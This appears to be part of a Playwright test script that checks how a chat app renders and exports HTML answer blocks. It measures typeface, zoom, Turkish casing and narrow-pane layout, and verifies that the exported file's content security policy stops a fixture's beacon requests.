      const tops = [...rows.keys()].sort((a, b) => a - b);
      const last = tops.map((t) => {
        const row = rows.get(t).sort((a, b) => box(a).left - box(b).left);
        return row[row.length - 1].className;
      });
      const tail = kids[kids.length - 1];
      return { rowCount: tops.length, last, tailWidth: Math.round(box(tail).width) };
    });

    ok('legacy arrow markup still wraps into more than one row',
      L.rowCount >= 2, `rows=${L.rowCount}`);
    ok('…and no row ends on a stranded arrow',
      L.last.every((c) => !/dc-flow-arrow/.test(c)), L.last.join(' | '));
    ok('…and its wrapped node does not fill the row either',
      L.tailWidth < 300, `width=${L.tailWidth}`);
  } finally {
    await browser.close();
  }
}

/**
 * THE BLOCK IS SET IN THE TRANSCRIPT'S TYPE — measured, in real Chromium, at two zooms.
 *
 * The defect (owner report 2026-09-02, with screenshots): "ana metin text size'i ile html
 * text size uyusmuyor / satir araliklari da uyusmuyor". The kit set itself at 14px/1.55
 * while every prose surface around it reads --chat-text (15px x --zoom) at 1.75, and since
 * CSS variables do not cross an iframe boundary the block also never heard the window's
 * "- 100% +" control at all. Both halves are invisible to a unit test: the CSS now SAYS
 * var(--chat-text), and would go on saying it while resolving to nothing.
 *
 * So this asserts computed pixels on both sides of the boundary, and does it twice — the
 * second pass drives the real zoom contract (--zoom on <html> + the dreamcontext-zoom
 * event) and requires the block to have MOVED. A block that matched at 1.0 and stayed put
 * at 1.25 is the original bug wearing the fix's clothes.
 *
 * Also checks the locale, in the same session and for the same reason: `text-transform:
 * uppercase` is locale-sensitive, and a srcdoc with no `lang` casts Turkish with the
 * English rules — "değiştiriyor" became "DEĞIŞTIRIYOR", dotless, a different word.
 */
async function runTypography(base, report) {
  const ok = (label, cond, detail = '') => report.check('typography', label, cond, detail);
  console.log('\n═══ the block reads in the transcript\'s type ═══');

  const browser = await chromium.launch();
  const page = await browser.newPage({ viewport: { width: 1280, height: 900 } });
  try {
    ok('a chat session opens against the real WS route', await openChatAndAsk(page, base));
    await page.waitForSelector('.chat-htmlview-frame', { timeout: 20000 });
    await page.waitForTimeout(1800);

    /** Computed px on BOTH sides: the transcript's own prose, and .dc-p inside the frame. */
    const measure = async () => {
      const host = await page.evaluate(() => {
        // The REAL paragraph the assistant's answer is set in — the prose immediately
        // above the block, in the same column. Deliberately not `--chat-text` read off the
        // pane: a custom property resolves lazily, so that reads back the unevaluated
        // `calc(15px * var(--zoom))` and any comparison against it is vacuous. Computed
        // pixels on a painted paragraph is the only honest left-hand side.
        const nodes = [...document.querySelectorAll('.chat-pane p')];
        const el = nodes.reverse().find((n) => (n.textContent || '').includes('shape of it'));
        if (!el) return { size: 0, line: 0, found: false };
        const cs = getComputedStyle(el);
        return { size: parseFloat(cs.fontSize), line: parseFloat(cs.lineHeight), found: true };
      });
      const frame = page.frameLocator('.chat-htmlview-frame').first();
      const inner = await frame.locator('.dc-p').first().evaluate((el) => {
        const cs = getComputedStyle(el);
        const root = getComputedStyle(document.documentElement);
        return {
          size: parseFloat(cs.fontSize),
          line: parseFloat(cs.lineHeight),
          rootSize: parseFloat(root.fontSize),
          lang: document.documentElement.lang,
        };
      });
      return { host, inner };
    };

    // ── F5: the FACE, not just the size ────────────────────────────────────────────────
    // Measured by RENDERED WIDTH, which is the only thing that cannot lie here:
    // `document.fonts.check()` returns true for a family the engine will happily fall back
    // on, and computed font-family reports the STACK rather than the face that won. Same
    // string, same size, same weight, probed on both sides of the frame boundary — if they
    // resolve different faces the widths differ, and they did: 473px against 430px, a 10%
    // gap that reads as "the text size doesn't match" (F5).
    const PROBE = `(() => {
      const el = document.createElement('span');
      el.textContent = 'Conversion 14.2% WWW degistiriyor';
      el.style.cssText = 'position:absolute;left:-9999px;font-size:40px;font-weight:400;white-space:pre';
      el.style.fontFamily = getComputedStyle(document.body).fontFamily;
      document.body.appendChild(el);
      const w = el.getBoundingClientRect().width;
      el.remove();
      return w;
    })()`;
    const hostFace = await page.evaluate(`(() => {
      const el = document.createElement('span');
      el.textContent = 'Conversion 14.2% WWW degistiriyor';
      el.style.cssText = 'position:absolute;left:-9999px;font-size:40px;font-weight:400;white-space:pre';
      el.style.fontFamily = getComputedStyle(document.querySelector('.chat-pane')).fontFamily;
      document.body.appendChild(el);
      const w = el.getBoundingClientRect().width;
      el.remove();
      return w;
    })()`);
    const blockFace = await page.frameLocator('.chat-htmlview-frame').first()
      .locator('body').evaluate((_b, p) => eval(p), PROBE);
    // Diagnostic reference points: what each side measures when FORCED to system-ui, so a
    // mismatch says which side fell back rather than merely that they differ.
    const forced = async (fam) => ({
      host: await page.evaluate(`(() => {
        const el = document.createElement('span');
        el.textContent = 'Conversion 14.2% WWW degistiriyor';
        el.style.cssText = "position:absolute;left:-9999px;font-size:40px;font-weight:400;white-space:pre;font-family:${fam}";
        document.body.appendChild(el);
        const w = el.getBoundingClientRect().width; el.remove(); return w;
      })()`),
      block: await page.frameLocator('.chat-htmlview-frame').first().locator('body')
        .evaluate((_b, f) => {
          const el = document.createElement('span');
          el.textContent = 'Conversion 14.2% WWW degistiriyor';
          el.style.cssText = `position:absolute;left:-9999px;font-size:40px;font-weight:400;white-space:pre;font-family:${f}`;
          document.body.appendChild(el);
          const w = el.getBoundingClientRect().width; el.remove(); return w;
        }, fam),
    });
    const sys = await forced('ui-sans-serif');
    const inter = await forced("'Inter'");
    report.note(`forced system-ui: host ${sys.host.toFixed(1)} / block ${sys.block.toFixed(1)}`);
    report.note(`forced Inter:     host ${inter.host.toFixed(1)} / block ${inter.block.toFixed(1)}`);

    ok('the block no longer falls back to the system face',
      Math.abs(blockFace - sys.block) > 4,
      `block ${blockFace.toFixed(1)}px, system fallback would be ${sys.block.toFixed(1)}px`);
    ok('the block is drawn in the SAME TYPEFACE as the transcript, not a fallback',
      Math.abs(hostFace - blockFace) < 2,
      `transcript ${hostFace.toFixed(1)}px vs block ${blockFace.toFixed(1)}px`);

    // EVERY face the kit uses, not just the body's. The kit also sets headings, values and
    // card titles in `--font-family-display` and code in `--font-mono`; each is a separate
    // webfont the app loads and the frame cannot. Measured on the REAL classes, because a
    // synthetic `font-family: 'X'` probe cannot tell a loaded face from a fallback.
    for (const [label, sel, token] of [
      ['display (.dc-h2)', '.dc-h2', '--font-family-display'],
      ['mono (.dc-code)', '.dc-code', '--font-mono'],
    ]) {
      const hostW = await page.evaluate((t) => {
        const pane = document.querySelector('.chat-pane');
        const el = document.createElement('span');
        el.textContent = 'Ceyrek okumasi WWW';
        el.style.cssText = 'position:absolute;left:-9999px;white-space:pre;font-size:40px;font-weight:700';
        el.style.fontFamily = getComputedStyle(pane).getPropertyValue(t);
        document.body.appendChild(el);
        const w = +el.getBoundingClientRect().width.toFixed(1); el.remove(); return w;
      }, token);
      const frameW = await page.frameLocator('.chat-htmlview-frame').first().locator('body')
        .evaluate((b, s2) => {
          const src = document.querySelector(s2);
          const el = document.createElement('span');
          el.textContent = 'Ceyrek okumasi WWW';
          el.style.cssText = 'position:absolute;left:-9999px;white-space:pre;font-size:40px;font-weight:700';
          el.style.fontFamily = src ? getComputedStyle(src).fontFamily : getComputedStyle(b).fontFamily;
          b.appendChild(el);
          const w = +el.getBoundingClientRect().width.toFixed(1); el.remove(); return w;
        }, sel).catch(() => -1);
      ok(`${label} — the block resolves the same face as the app`,
        frameW > 0 && Math.abs(hostW - frameW) < 2, `host ${hostW}px vs block ${frameW}px`);
    }

    const srcdocKB = await page.locator('.chat-htmlview-frame').first()
      .evaluate((el) => Math.round((el.getAttribute('srcdoc') || '').length / 1024));
    report.note(`srcdoc is ${srcdocKB}KB per block with the face embedded`);

    const at1 = await measure();
    ok('the transcript paragraph beside the block was found and measured',
      at1.host.found && at1.host.size > 0, `size=${at1.host.size}px line=${at1.host.line}px`);
    ok('the block is set at the transcript\'s reading SIZE, to the pixel',
      Math.abs(at1.inner.size - at1.host.size) < 0.51,
      `block=${at1.inner.size}px transcript=${at1.host.size}px`);
    ok('…and led at the transcript\'s RHYTHM, not its own tighter one',
      Math.abs(at1.inner.line - at1.host.line) < 1.01,
      `block=${at1.inner.line}px transcript=${at1.host.line}px`);
    ok('…and the srcdoc carries the app locale, so uppercase casts by its rules',
      at1.inner.lang.length > 0, `lang="${at1.inner.lang}"`);

    // Scrolled to the block on purpose: the pair of shots this leaves behind is the
    // before/after evidence a human reads, and it is only evidence if the transcript
    // paragraph and the block are in the same frame.
    const showBlock = async () => {
      await page.evaluate(() => document.querySelector('.chat-htmlview')
        ?.scrollIntoView({ block: 'center' }));
      await page.waitForTimeout(400);
    };
    await showBlock();
    await page.screenshot({ path: join(SHOTS, 'chat-html-type-zoom-100.png'), fullPage: false });

    // ── the same measurement, through the window's own zoom contract ──────────────────
    await page.evaluate(() => {
      document.documentElement.style.setProperty('--zoom', '1.25');
      window.dispatchEvent(new CustomEvent('dreamcontext-zoom', { detail: 1.25 }));
    });
    await page.waitForTimeout(1200);
    const at125 = await measure();

    ok('zoom moved the transcript — the control did something to measure against',
      at125.host.size > at1.host.size + 1,
      `${at1.host.size}px -> ${at125.host.size}px`);
    ok('the block MOVED WITH IT — this is the half the iframe boundary used to swallow',
      at125.inner.size > at1.inner.size + 1,
      `${at1.inner.size}px -> ${at125.inner.size}px`);
    ok('…and it is still the transcript\'s size at the new zoom',
      Math.abs(at125.inner.size - at125.host.size) < 0.51,
      `block=${at125.inner.size}px transcript=${at125.host.size}px`);
    ok('…the whole scale rode along, not just the body (dc-h2 grew too)',
      at125.inner.rootSize > at1.inner.rootSize + 1,
      `root ${at1.inner.rootSize}px -> ${at125.inner.rootSize}px`);

    await showBlock();
    await page.screenshot({ path: join(SHOTS, 'chat-html-type-zoom-125.png'), fullPage: false });
  } finally {
    await browser.close();
  }
}

/**
 * TURKISH UPPERCASE, and the narrow pane the owner's second screenshot was taken in.
 *
 * Two defects from one screenshot. `.dc-label` uppercases, and CSS casing follows the
 * document's language: with no `lang` the frame turned "değişiyor" into "DEĞIŞIYOR" —
 * dotless I, which in Turkish is a different letter. And a `dc-grid--4` of stat tiles in a
 * ~380px pane gave each column ~80px, in which a 2rem `.dc-value` clipped mid-number
 * ("190.313" rendered cut). Neither is visible at desk width in English, which is how both
 * shipped. No server: the subject is the stylesheet, so this loads exactly that.
 */
async function runNarrowAndTurkish(report) {
  const ok = (label, cond, detail = '') => report.check('narrow+tr', label, cond, detail);
  console.log('\n═══ a narrow pane, in Turkish ═══');

  const kitCss = readFileSync(
    join(REPO, 'dashboard', 'src', 'components', 'sleepy', 'chat', 'chat-html-kit.css'),
    'utf-8',
  );
  const tokens = `:root{--font-family:system-ui;--font-family-display:system-ui;--font-mono:monospace;
--chat-text:15px;--chat-line-height:1.75;
--color-text:#e8e8ee;--color-text-secondary:#b5b5c0;--color-text-tertiary:#8a8a96;
--color-border:#3a3a44;--color-bg-secondary:#1d1d24;--color-bg-tertiary:#26262e;
--color-accent:#8b7cf6;--color-accent-soft:#8b7cf62e;--chart-1:#8b7cf6;
--radius-sm:6px;--radius-md:9px;--radius-lg:12px;
--color-success:#4ade80;--color-error:#f87171;--color-warning:#fbbf24;}`;

  const markup = `<div class="dc-doc">
    <span class="dc-label" id="label">pay el değiştiriyor</span>
    <div class="dc-grid dc-grid--4" id="grid">
      <div class="dc-stat"><span class="dc-stat-label">Gelir</span>
        <span class="dc-value" id="v">190.313</span></div>
      <div class="dc-stat"><span class="dc-stat-label">B</span><span class="dc-value">2</span></div>
      <div class="dc-stat"><span class="dc-stat-label">C</span><span class="dc-value">3</span></div>
      <div class="dc-stat"><span class="dc-stat-label">D</span><span class="dc-value">4</span></div>
    </div>
    <div class="dc-table-wrap" id="wrap"><table class="dc-table"><tbody><tr>
      ${Array.from({ length: 9 }, (_x, i) => `<td>uzunca bir hücre ${i}</td>`).join('')}
    </tr></tbody></table></div>
  </div>
  <div class="dc-doc dc-doc--hug" id="hug"><span class="dc-chip">tek</span></div>
  <div class="dc-flow"><span class="dc-flow-node" id="plain">nötr</span>
    <span class="dc-flow-node dc-flow-node--warn" id="toned">riskli</span></div>`;

  const browser = await chromium.launch();
  // 380px: the chat pane with the slide-over open, which is where the screenshot came from.
  const page = await browser.newPage({ viewport: { width: 380, height: 700 }, colorScheme: 'dark' });
  try {
    await page.setContent(
      `<!doctype html><html lang="tr"><head><style>${tokens}\n${kitCss}</style></head>`
      + `<body>${markup}</body></html>`,
    );
    await page.waitForTimeout(200);

    const m = await page.evaluate(() => {
      const el = (s) => document.querySelector(s);
      const val = el('#v');
      const cols = new Set(
        [...el('#grid').children].map((c) => Math.round(c.getBoundingClientRect().left)),
      ).size;
      const wrap = el('#wrap');
      return {
        // The rendered casing, read back off the painted box rather than the source text.
        label: getComputedStyle(el('#label')).textTransform,
        cast: 'değiştiriyor'.toLocaleUpperCase(document.documentElement.lang),
        columns: cols,
        // Clipping, as the browser sees it: the number's own ink vs the box it is given.
        valueScroll: val.scrollWidth,
        valueBox: Math.round(val.getBoundingClientRect().width),
        tableScrolls: wrap.scrollWidth > wrap.clientWidth + 1,
        tableClipped: wrap.getBoundingClientRect().width > document.body.clientWidth + 1,
        hugWidth: Math.round(el('#hug').getBoundingClientRect().width),
        paneWidth: document.body.clientWidth,
        // A toned node must be TINTED, not filled: the same surface family the callout
        // uses, so normal body text still reads on it.
        plainBg: getComputedStyle(el('#plain')).backgroundColor,
        tonedBg: getComputedStyle(el('#toned')).backgroundColor,
        tonedBorder: getComputedStyle(el('#toned')).borderTopColor,
      };
    });

    ok('the label really is uppercased — otherwise the casing check proves nothing',
      m.label === 'uppercase', m.label);
    ok('Turkish casts with a DOTTED İ, because the document says lang="tr"',
      m.cast === 'DEĞİŞTİRİYOR', m.cast);
    ok('a dc-grid--4 gives way to fewer columns instead of squeezing four into 380px',
      m.columns <= 2, `${m.columns} columns at 380px`);
    ok('…so the headline number is not clipped mid-digit',
      m.valueScroll <= m.valueBox + 1, `ink=${m.valueScroll}px box=${m.valueBox}px`);
    ok('a table wider than the pane scrolls inside its wrap', m.tableScrolls);
    ok('…and does not push the block itself past the pane', !m.tableClipped);
    ok('a dc-doc--hug block hugs its one chip instead of spreading over the pane',
      m.hugWidth < m.paneWidth / 2, `hug=${m.hugWidth}px pane=${m.paneWidth}px`);
    ok('a toned flow node is a TINT, not the solid chart fill it used to have to borrow',
      m.tonedBg !== m.plainBg && m.tonedBorder !== 'rgb(251, 191, 36)',
      `plain=${m.plainBg} toned=${m.tonedBg} border=${m.tonedBorder}`);

    await page.screenshot({ path: join(SHOTS, 'chat-html-narrow-tr.png'), fullPage: true });
  } finally {
    await browser.close();
  }
}

/**
 * A BLOCK COMES OUT AS A FILE — the whole point of the export layer, in real Chromium.
 *
 * The defect this exists for (owner feature request, 2026-08-29): the only way to get a
 * block out was a screenshot, so anything worth sharing got written a second time by hand.
 *
 * Three things a unit test cannot prove, all proven here against the real chat session:
 *   1. The frame ANSWERS the snapshot request, and answers with what is ON SCREEN — the
 *      fixture's script sets "Ran: no" to "yes", so a snapshot still saying "no" means the
 *      export is shipping the authored markup rather than the render.
 *   2. The four buttons each produce their artifact: a real PNG (magic bytes, real pixels,
 *      not a blank canvas), a downloaded HTML file that opens and draws standalone, and a
 *      clipboard attempt that reports honestly when the platform refuses.
 *   3. The exported HTML is genuinely self-contained — opened with the network cut, it
 *      still renders, which is the property the whole design leans on.
 */
async function runExport(base, report) {
  const ok = (label, cond, detail = '') => report.check('export', label, cond, detail);
  console.log('\n═══ a block comes out as a file ═══');

  const browser = await chromium.launch();
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 }, acceptDownloads: true });
  const page = await ctx.newPage();
  try {
    ok('a chat session opens against the real WS route', await openChatAndAsk(page, base));
    await page.waitForSelector('.chat-htmlview-frame', { timeout: 20000 });
    await page.waitForTimeout(1800);

    await page.locator('.chat-htmlview-full-btn').first().click({ force: true });
    ok('fullscreen opened, where the export bar lives',
      await untilOn(page, async () => (await page.locator('.chat-htmlview-full').count()) > 0, 8000));
    await page.waitForTimeout(1200);

    // Open the detail INSIDE THE FRAME THAT WILL BE EXPORTED. Fullscreen is its own
    // document, so a click on the inline copy proves nothing about this one — and the
    // export must carry what THIS reader is looking at. `#more` is `display:none` in the
    // authored markup, so if it comes out expanded, the snapshot is genuinely live.
    const fullInner = page.frameLocator('.chat-htmlview-full iframe').first();
    await fullInner.locator('#grow').click();
    await page.waitForTimeout(400);
    ok('the reader opened a detail in the frame about to be exported',
      (await fullInner.locator('#more').evaluate((el) => getComputedStyle(el).display)) === 'block');

    const bar = page.locator('.chat-htmlexport-btn');
    // Four ways OUT, and nothing else. The request's sketch had a fifth ("☆ Save", into the
    // brain); the owner retired that whole layer on 2026-09-02 — "sadece indirebilelim
    // yeter" — so a fifth button reappearing here is a regression, not a feature.
    ok('the export bar offers four ways out, and no second home for the block',
      (await bar.count()) === 4, `${await bar.count()} buttons`);

    // ── 1. HTML: the file, and what is in it ────────────────────────────────────────────
    const htmlDl = await Promise.all([
      page.waitForEvent('download', { timeout: 20000 }),
      page.getByTitle(/self-contained HTML/).click(),
    ]).then(([d]) => d);
    const htmlPath = join(SHOTS, 'exported-block.html');
    await htmlDl.saveAs(htmlPath);
    const exported = readFileSync(htmlPath, 'utf-8');

    ok('the HTML button downloads a file, named off the block\'s own heading',
      /rendered-answer\.html$/.test(htmlDl.suggestedFilename()), htmlDl.suggestedFilename());
    ok('…carrying the live render, not the authored markup',
      exported.includes('>yes<'),
      exported.includes('>no<') ? 'exported the BEFORE state' : 'no marker found');
    // Not "the markup exists" — it always did, hidden. EXPANDED is the claim.
    ok('…including the detail the reader had opened, expanded as they left it',
      /id="more"[^>]*style="[^"]*display:\s*block/.test(exported),
      (exported.match(/id="more"[^>]*>/) || ['not found'])[0]);
    ok('…with the kit and the resolved tokens inlined',
      exported.includes('.dc-doc') && /--color-text:\s*[^;]+;/.test(exported));
    ok('…and the same CSP the live block runs under',
      exported.includes("default-src 'none'"));
    // NOT "contains no URL": this fixture's block deliberately carries hostile fetch calls
    // in its own script TEXT, and an export that stripped them would be lying about what
    // the block is. The property that matters is that the document never LOADS anything —
    // no stylesheet, no font, no remote image. Proven twice: statically here, and then by
    // counting requests when the file is opened with the network cut.
    ok('…and it references no external resource to load',
      !/<link[^>]+href|@import\s|<img[^>]+src\s*=\s*["']https?:|url\(\s*["']?https?:/i.test(exported));

    // ── 2. …and it actually RENDERS, with the network cut ───────────────────────────────
    const offline = await browser.newContext({ offline: true, viewport: { width: 1000, height: 800 } });
    const opened = await offline.newPage();
    // ATTEMPTED vs COMPLETED — the same distinction the live-sandbox pass draws above, and
    // for the same reason. The exported file re-runs the block's own script (its `<script>`
    // elements come back through `innerHTML` and execute on re-parse), so the two hostile
    // `<img>` beacons are genuinely ISSUED. What has to be true is that the CSP the file
    // carries kills every one of them: attempted may be non-zero, finished must be zero.
    const asked = [];
    const finishedOut = [];
    opened.on('request', (r) => { if (!r.url().startsWith('file://')) asked.push(r.url()); });
    opened.on('requestfinished', (r) => { if (!r.url().startsWith('file://')) finishedOut.push(r.url()); });
    await opened.goto(`file://${htmlPath}`, { waitUntil: 'load' });
    await opened.waitForTimeout(600);
    const drawn = await opened.evaluate(() => {
      const doc = document.querySelector('.dc-doc');
      const title = document.querySelector('.dcx-title');
      const box = doc?.getBoundingClientRect();
      return {
        wide: Math.round(box?.width ?? 0),
        tall: Math.round(box?.height ?? 0),
        titled: (title?.textContent || '').trim(),
        painted: doc ? getComputedStyle(doc.querySelector('.dc-stat') ?? doc).backgroundColor : '',
      };
    });
    ok('the exported file opens OFFLINE and draws the block', drawn.wide > 300 && drawn.tall > 200,
      `${drawn.wide}x${drawn.tall}`);
    // The decisive one. The block's own script asks for two hostile hosts; under the CSP
    // the file carries, neither attempt is ever made — so a file mailed to a colleague
    // cannot beacon from their machine either.
    ok('…and the block\'s own hostile beacons still complete NOWHERE, off this machine',
      finishedOut.length === 0, finishedOut.join(' | '));
    ok('…killed by the policy the FILE carries, not by the app it was exported from',
      asked.length === 0 || asked.every((u) => !finishedOut.includes(u)),
      `attempted ${asked.length}, finished ${finishedOut.length}`);
    ok('…with its name on it', drawn.titled.length > 0, drawn.titled);
    ok('…and the theme surface really painted, not a naked default',
      drawn.painted !== '' && drawn.painted !== 'rgba(0, 0, 0, 0)', drawn.painted);
    await opened.screenshot({ path: join(SHOTS, 'exported-block-offline.png'), fullPage: true });
    await offline.close();

    // ── 3. PNG: a real image with real pixels ───────────────────────────────────────────
    const pngDl = await Promise.all([
      page.waitForEvent('download', { timeout: 30000 }),
      page.getByTitle(/as a PNG image/).click(),
    ]).then(([d]) => d);
    const pngPath = join(SHOTS, 'exported-block.png');
    await pngDl.saveAs(pngPath);
    const png = readFileSync(pngPath);

    ok('the PNG button downloads a real PNG',
      png.length > 4 && png[0] === 0x89 && png.subarray(1, 4).toString() === 'PNG',
      `${png.length} bytes`);
    // A foreignObject render that failed silently is the classic way to ship a blank
    // rectangle, so this asserts the image has CONTENT, not just a header.
    const px = await page.evaluate(async (bytes) => {
      const blob = new Blob([new Uint8Array(bytes)], { type: 'image/png' });
      const bmp = await createImageBitmap(blob);
      const c = document.createElement('canvas');
      c.width = bmp.width; c.height = bmp.height;
      const g = c.getContext('2d');
      g.drawImage(bmp, 0, 0);
      const d = g.getImageData(0, 0, c.width, c.height).data;
      const seen = new Set();
      for (let i = 0; i < d.length; i += 4 * 97) seen.add(`${d[i]},${d[i + 1]},${d[i + 2]}`);
      return { w: bmp.width, h: bmp.height, colors: seen.size };
    }, [...png]);
    ok('…at the export width, times the raster scale', px.w === 900 * 2, `${px.w}x${px.h}`);
    ok('…and it is not a blank rectangle — the block is really drawn in it',
      px.colors > 3, `${px.colors} distinct sampled colours`);

    // ── The defect this pass closed: a download that said nothing (owner, 2026-09-02) ──
    // Chromium is not the desktop webview, so what is proven here is the FALLBACK half —
    // the file is named back to the reader. The desktop half (an absolute path from
    // `POST /api/agent/download` plus the Show button) needs the real app; it cannot be
    // reached from a browser, where the route 403s by design.
    const dlNote = await page.locator('.dl-note-text').first().textContent().catch(() => null);
    ok('a downloaded file names itself back to the reader — never a silent success',
      !!dlNote && /\.png\b/i.test(dlNote), JSON.stringify(dlNote));

    // ── 4. Copy: succeeds, or says so ───────────────────────────────────────────────────
    await page.getByTitle(/clipboard as an image/).click();
    await page.waitForTimeout(2500);
    const note = await page.locator('.dl-note-text').first().textContent().catch(() => null);
    ok('the copy button reports an outcome either way — never a silent no-op',
      note !== null && note.trim().length > 0, JSON.stringify(note));

    await page.screenshot({ path: join(SHOTS, 'chat-html-export-bar.png') });
  } finally {
    await ctx.close();
    await browser.close();
  }
}

/**
 * A SENTENCE STAYS A SENTENCE — the worst defect this surface ever shipped, and the one the
 * owner could only describe as "hiçbir şey anlaşılmıyor" (2026-09-02, with a screenshot).
 *
 * Six of the kit's containers were flex COLUMNS. A flex column makes every direct child a
 * flex item — including bare text runs and inline elements — so an author writing an
 * ordinary sentence with a `dc-code` chip in the middle of it got three stacked full-width
 * rows: "…zincirinden çıkıp" / [bağımsız if] / "olur; hourlyRate…". Every explanation the
 * agent wrote that way was cut into fragments, and no test saw it because the markup was
 * perfectly valid and every class existed. Only layout can see this.
 *
 * The fix is block flow with `> * + *` for the rhythm. This pass is the lock on it: it
 * writes the exact shape from that screenshot and requires the chip to hug its own text.
 */
async function runSentenceIntegrity(report) {
  const ok = (label, cond, detail = '') => report.check('sentence', label, cond, detail);
  console.log('\n═══ a sentence stays a sentence ═══');

  const kitCss = readFileSync(
    join(REPO, 'dashboard', 'src', 'components', 'sleepy', 'chat', 'chat-html-kit.css'), 'utf-8');
  const tokens = `:root{--font-family:system-ui;--font-family-display:system-ui;
--font-mono:ui-monospace,monospace;--color-text:#e8e8ee;--color-text-secondary:#b5b5c0;
--color-text-tertiary:#8a8a96;--color-border:#3a3a44;--color-bg-secondary:#1d1d24;
--color-bg-tertiary:#26262e;--color-accent:#8b7cf6;--color-accent-soft:#8b7cf62e;
--color-warning:#fbbf24;--chart-1:#8b7cf6;--radius-sm:6px;--radius-md:9px;--radius-lg:12px;
--chat-text:15px;--chat-line-height:1.75;}
body{background:#131318;margin:0;padding:20px}`;

  // Every container that holds prose, each given a sentence with an inline chip in it —
  // written as a DIRECT child, which is what an agent naturally writes.
  const CASES = [
    ['dc-step-body', '<div class="dc-steps"><div class="dc-step"><div class="dc-step-body" id="t">'
      + 'Kontrol <span class="dc-code" id="c">bağımsız if</span> olur ve loglar.</div></div></div>'],
    ['dc-doc', '<div class="dc-doc" id="t">Kontrol <span class="dc-code" id="c">bağımsız if</span> olur.</div>'],
    ['dc-stack', '<div class="dc-stack" id="t">Kontrol <span class="dc-code" id="c">bağımsız if</span> olur.</div>'],
    ['dc-card', '<div class="dc-card" id="t">Kontrol <span class="dc-code" id="c">bağımsız if</span> olur.</div>'],
    ['dc-option', '<div class="dc-option" id="t">Kontrol <span class="dc-code" id="c">bağımsız if</span> olur.</div>'],
    ['dc-tl-body', '<div class="dc-timeline"><div class="dc-tl"><span class="dc-tl-dot"></span>'
      + '<div class="dc-tl-body" id="t">Kontrol <span class="dc-code" id="c">bağımsız if</span> olur.</div></div></div>'],
    ['dc-stat', '<div class="dc-stat" id="t">Kontrol <span class="dc-code" id="c">bağımsız if</span> olur.</div>'],
    ['dc-slide', '<div class="dc-slides"><section class="dc-slide" id="t">'
      + 'Kontrol <span class="dc-code" id="c">bağımsız if</span> olur.</section></div>'],
  ];

  const browser = await chromium.launch();
  const page = await browser.newPage({ viewport: { width: 900, height: 500 }, colorScheme: 'dark' });
  try {
    for (const [label, markup] of CASES) {
      await page.setContent(`<!doctype html><style>${tokens}\n${kitCss}</style>${markup}`);
      await page.waitForTimeout(120);
      const m = await page.evaluate(() => {
        const t = document.getElementById('t');
        const box = t.getBoundingClientRect();
        const chip = document.getElementById('c').getBoundingClientRect();
        return {
          box: Math.round(box.width),
          chip: Math.round(chip.width),
          // The real question is not "is the chip narrow" — a container that shrinks to its
          // content (dc-tl-body) is legitimately barely wider than the chip. It is whether
          // TEXT SITS BESIDE IT: a shattered sentence puts the chip on its own line at the
          // container's left edge.
          insetFromLeft: Math.round(chip.left - box.left),
          lineHeight: Math.round(parseFloat(getComputedStyle(t).lineHeight)),
          dropFromTop: Math.round(chip.top - box.top),
        };
      });
      ok(`${label} — an inline chip flows in the sentence, not onto its own row`,
        m.chip < m.box - 20 && m.insetFromLeft > 10,
        `chip ${m.chip}px of ${m.box}px, ${m.insetFromLeft}px in from the left`);
    }

    // And the rhythm the flex `gap` used to provide is still there, or the fix traded one
    // defect for a wall of text with no spacing.
    await page.setContent(`<!doctype html><style>${tokens}\n${kitCss}</style>
      <div class="dc-doc"><p class="dc-p" id="a">bir</p><p class="dc-p" id="b">iki</p></div>`);
    await page.waitForTimeout(120);
    const gap = await page.evaluate(() => {
      const a = document.getElementById('a').getBoundingClientRect();
      const b = document.getElementById('b').getBoundingClientRect();
      return Math.round(b.top - a.bottom);
    });
    ok('…and block children still get the document rhythm', gap >= 12 && gap <= 16, `${gap}px`);

    // ── A DECISION BLOCK STAYS READABLE AT EVERY PANE WIDTH ───────────────────────────
    // `auto-fit` keeps columns for as long as they FIT, which is not the same as for as
    // long as they READ. The measure is what decides: below ~40 characters a line, prose
    // breaks every three words and a two-column comparison becomes two ragged ribbons
    // (owner screenshot 2026-09-02, measured at 27 characters). Checked at the widths a
    // chat pane really takes, including the slide-over-open one where it used to fail.
    const OPT = (t, k) => `<div class="dc-option ${k}"><div class="dc-option-head">`
      + `<span class="dc-option-title">${t}</span></div><ul class="dc-list"><li id="probe">`
      + 'Kablo takılı — webhook provisioner\'ı welcome\'a geçiriyor, welcome da çağırıyor. '
      + 'Yani eksik entegrasyon değil, çalışan bir dalda düşme.</li></ul></div>';
    for (const w of [960, 760, 620, 534, 460]) {
      await page.setViewportSize({ width: w, height: 900 });
      await page.setContent(`<!doctype html><style>${tokens}\n${kitCss}</style>`
        + `<div class="dc-doc"><div class="dc-compare" id="cmp">${OPT('A', '')}${OPT('B', 'dc-option--pick')}</div></div>`);
      await page.waitForTimeout(120);
      const m = await page.evaluate(() => {
        const cmp = document.getElementById('cmp');
        const cols = new Set([...cmp.children].map((o) => Math.round(o.getBoundingClientRect().left))).size;
        const li = document.getElementById('probe');
        const r = document.createRange(); r.selectNodeContents(li);
        const lines = new Set([...r.getClientRects()].map((x) => Math.round(x.top))).size;
        return { cols, per: Math.round((li.textContent || '').trim().length / lines) };
      });
      ok(`a dc-compare still reads at a ${w}px pane`, m.per >= 40,
        `${m.cols} column(s), ${m.per} characters a line`);
    }
    await page.setViewportSize({ width: 900, height: 500 });

    await page.setContent(`<!doctype html><style>${tokens}\n${kitCss}</style>
      <div class="dc-doc">${CASES[0][1]}</div>`);
    await page.waitForTimeout(150);
    await page.screenshot({ path: join(SHOTS, 'chat-html-sentence.png') });
  } finally {
    await browser.close();
  }
}

// ─── main ─────────────────────────────────────────────────────────────────────────────

const report = {
  rows: [],
  check(theme, label, cond, detail = '') {
    this.rows.push({ theme, label, cond, detail });
    console.log(`  ${cond ? 'PASS' : 'FAIL'} ${label}${!cond && detail ? ` — ${detail}` : ''}`);
  },
  note(msg) { console.log(`  note: ${msg}`); },
};

let server;
try {
  // The port is chosen FIRST: the fixture's reachable beacon has to name this run's own
  // server, so the scripted answer can't be built before the port is known.
  const port = await freePort();
  const base = `http://127.0.0.1:${port}`;
  setup(base);
  server = await startServer(port);
  for (const theme of (process.env.VERIFY_THEMES || 'light,dark').split(',')) {
    // A live session is persisted per vault, so the second browser would open onto the
    // restored conversation instead of a fresh composer. Same reset dream-actions does.
    rmSync(join(PROJ, '_dream_context', 'state', '.agent-sessions.json'), { force: true });
    await runTheme(base, theme, report);
  }
